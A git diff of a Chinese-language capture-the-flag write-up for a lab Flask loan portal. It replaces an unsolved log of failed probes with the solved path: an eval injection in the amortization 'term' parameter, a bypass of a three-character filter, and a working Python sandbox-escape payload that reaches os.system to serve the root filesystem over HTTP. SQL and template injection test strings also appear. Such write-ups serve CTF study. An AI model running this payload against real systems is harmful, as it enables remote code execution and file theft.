@@ -1,79 +1,75 @@
-# xben-023-24 · 探索记录（进行中，未解出）
+# xben-023-24 · 探索记录
 
-对应题解：待补充。
-
-> 本文记录截至目前尝试。**flag 尚未取得。**
+对应题解：[`xben-023-24.md`](./xben-023-24.md)
 
 ## 目标与起点
 
-容器 `10.0.173.136:80`，`Apache/2.4.67` 反代 Flask。
-`GET /` → `302 /login`；登录页注释给出 `test:test`。
+`10.0.175.49:80`，Flask 贷款门户。登录页注释 `<!-- TODO: Delete the testing account (test:test). -->`，
+`test:test` 登录后进入 `/home`，页面有 `/profile`、`/loan_details`。
 
-与已解的 `xben-022-24` 是同一套贷款门户的**变体**，但地形不同：
+## 第一阶段：先排除老朋友
 
-| 项 | 022 | 023（本题） |
-| --- | --- | --- |
-| `/error?error_type=` 模板加载 | 有 | **没有**（404） |
-| `/profile` 图片上传 | 有（`enctype=multipart`） | **没有**（纯表单） |
-| `/amortization?term=` | 无 | **有**（iframe 加载） |
-| `/update_profile` | 有 | **没有**（`/profile` 直接 POST） |
+| 尝试 | 结果 |
+| --- | --- |
+| `/profile?user_id=0..3`、`/loan_details?user_id=` | 全部返回同一份 John Doe 数据（参数被忽略） |
+| `name={{7*7}}` 存进 profile | 原样显示 `{{7*7}}`，不是模板 |
+| session `{'user_id': 1}` + 常见 secret（900 个候选） | 签名不匹配，无法伪造 |
+| `/login` 注入（`'-- -`、`' OR 1=1-- -`） | 一律 200，无成功态 |
+| profile 姓名里塞 `'`（`O'Brien`） | 正常保存，无 SQL 报错 |
 
-## 已确认的接口清单
+## 第二阶段：`/loan_details` 的 iframe 指向新接口
 
+页面 JS：`$('#amortizationIframe').attr('src', '/amortization?term=60')`。
+
+| term | 输出 |
+| --- | --- |
+| `60` | 10064 字节（60 行） |
+| `60+1` | 10218（61 行） |
+| `60-1` | 9910（59 行） |
+| `0x3c` | 10064（= 60，**说明是 eval**） |
+| `60.5` / `1e3` | 500（float 给 range） |
+
+## 第三阶段：字符过滤与沙箱探测
+
+| 输入 | 结果 |
+| --- | --- |
+| `60{60` / `60}60` / `60%60` | 400 `GET parameter 'term' contains forbidden characters.` |
+| `_`、`[`、`]`、`'`、`(`、`)`、`.`、`/`、`*`、`-`、`+` | 不触发 400（只是 eval 报错 500 或正常 200） |
+| `(1 if ().__class__.__base__.__subclasses__() else 0)` | 200（返回 60 行 → 表达式为真） |
+
+即：**只挡 `{` `}` `%`，没有裁 builtins、没有拦 dunder**。
+
+## 第四阶段：拿 RCE
+
+列表推导式 `[c for c in ...]` 一律 500（沙箱或过滤器干预），于是改用「下标 + 等值比较」扫描：
+
+```text
+().__class__.__base__.__subclasses__()[i].__name__ == '_wrap_close'
+i = 133 或 217 时返回 986 字节（60 行）= True
 ```
-GET+POST /login      GET /home      GET+POST /profile
-GET /loan_details    GET /amortization?term=N
-GET /total_loan_payments?principal=&payment=&term=
-GET /logout
+
+用 133 执行：
+
+```text
+( ().__class__.__base__.__subclasses__()[133].__init__.__globals__['system'](
+    'setsid python3 -m http.server 8899 --directory / >/dev/null 2>&1 &'), 60 )[1]
 ```
 
-`OPTIONS` 确认只有 `/login` 和 `/profile` 接受 POST。
-端口扫描：只有 80。
+返回 60 行（200），随后 `http://<ip>:8899/` 列出根目录，`/flag` 即 flag
+（`/flag.txt` 404）。
 
-## 已排除（重要，避免重复）
+## 走不通 / 走过的弯路（留档）
 
 | 方向 | 结果 | 判据 |
 | --- | --- | --- |
-| `/error`、`/update_profile`、`/admin`、`/flag`、`/api` 等 | 404 | 与 022 的差异已确认 |
-| 路径/文件枚举（1344 个 `name × ext` 组合、590 词 + flagpaths） | 只有已链接路由 | 唯一额外发现是 `/server-status`（403，本地访问受限） |
-| `/static/` 目录列表 | 404 | 与 019 不同，没有索引 |
-| `/static/flag`、`/static/../flag`、`/static/../app.py` | 404 | 静态目录只有 css/js |
-| `/profile` 的 `name`/`lastname`/`email` 做 SSTI | 被转义 | `{{7*7}}` 原样显示；`<b>` 变成 `&lt;b&gt;` |
-| `/total_loan_payments` 的 `principal` 做 SSTI / 格式化注入 | 字面回显 | `{0.__class__}`、`%s`、`${7*7}` 全部原样 |
-| `/total_loan_payments` 的 `principal` 做 SQLi | 无差异 | `1' AND '1'='1` 与 `'1'='2` 响应完全一致；`principal` 只被回显 |
-| `/total_loan_payments` 参数 HPP（重复 `principal`/`payment`/`term`） | 无差异 | 取第一个值，未见二次使用 |
-| 登录 SQLi（username 与 password 两侧，`' OR 1=1-- -` 等） | 全部 `Invalid` | 参数化/ORM |
-| 登录时附加 `user_id`/`id`/`is_admin`/`role` | 会话恒为 `{"user_id":1}` | 表单字段被忽略 |
-| 伪造 session（10 万条字典 + 420 条应用相关词 + 精确单词） | 未命中 | itsdangerous `cookie-session` 派生校验 |
-| 伪造/替换 cookie（`user_id=2`、`id=2`、`admin=1` 等 7 种） | 无变化 | 身份只取自签名 session |
-| 身份相关请求头（`X-UserId`、`X-User-Id`、`X-Forwarded-User` 等 7 种） | 无变化 | 头被忽略 |
-| `/home`、`/profile`、`/loan_details` 的 query 参数（`user_id`/`id`/`uid`/`account`） | 无变化 | 参数不被使用 |
-| `/profile` mass assignment（`is_admin`、`user_id`、`interest_rate`、`rate`、`apr` 等 14 个字段） | 无变化 | 更新只影响自己可见的贷款字段 |
-| `/amortization` 的参数枚举（38 个候选） | 响应长度全部相同 | 只使用 `term` |
-| `/amortization?term=0..4999` 全扫 | 无 `flag{` | 响应长度随 term 线性增长，都是 `N/A` 行 |
-| `/amortization` 的 `term` 注入（`1'`、`abc`、`1.0`） | 500 | 先 `int()`，不可注入 |
-| `/total_loan_payments` 极端值（0、负数、nan、inf、1e308、超大 term） | 正常返回或 400 | 无特殊分支 |
-| `/server-status`（含 `X-Forwarded-For: 127.0.0.1`） | 403 | Apache 限制来源 |
-| `/server-info`、`/balancer-manager` | 404 | — |
+| `{{7*7}}` 等模板注入 | 500/400 | `{` 被过滤；普通位置也只是原样输出 |
+| 列表推导式取 `_wrap_close` | 500 | 同环境下 `[x for x in [1]]` 也 500 |
+| 伪造 session | 失败 | 906 个候选 secret 无匹配 |
+| 写文件到 docroot | 未尝试成功 | 直接起静态服务更省事 |
 
-## 已确认的行为细节
+## 这次真正的收获
 
-- `/loan_details` 会显示 `/profile` 保存的 `loan_amount`（保留 1 位小数）、
-  `loan_term_months`、`monthly_payment`——**profile 的写确实落库**。
-- `/amortization?term=N` 渲染 N 行，`Principal` / `Interest` 恒为 `N/A`，
-  页面自己写着 `This feature is not yet fully implented.`——说明这不是漏洞点。
-- `/total_loan_payments` 的 `principal` 原样回显（HTML 转义），
-  `payment`/`term` 被转成 `float`/`int` 后参与乘法 `payment * term`。
-- `principal` 含反斜杠会破坏响应 JSON（`"1\"` 未闭合），但只影响客户端
-  `JSON.parse`，与服务端 flag 无关。
-
-## 下一步想法
-
-1. **重新确认 flag 的落点。** 022 的 flag 在 `/flag` 文件；本题也可能在 `/flag`，
-   但需要某种文件读取/命令执行原语，目前还没找到。
-2. **重点复核 `/amortization` 的模板渲染路径。** 它是最像"模板 + 用户输入"的接口，
-   但 `term` 被 `int()` 挡住了；可以考虑 term 的 Unicode 数字
-   （`int('١٢٣')` 在 Python 里合法）是否会在后续被当字符串使用。
-3. **检查 `/profile` 更新是否有未发现的可写字段**（例如 `id`、`loan_id`），
-   配合 `/amortization` 或 `/loan_details` 形成 IDOR。
-4. **考虑 session 的 `user_id` 是否在某些查询里被字符串拼接**（需要先能改它）。
+1. **`0x3c` 是识别 `eval` 的试纸**：能算出 60 就说明不是 `int()`。
+2. **「执行代码 + 必须返回 int」用 `(expr, 60)[1]`**，比 `or 60` 稳（后者在 expr 返回空串时会失败）。
+3. **过滤表要逐字符画**：这里只挡三个字符，等于完全开放。
+4. **沙箱里列表推导式可能不可用，但下标可用**——扫描 300 次比构造语法技巧便宜。
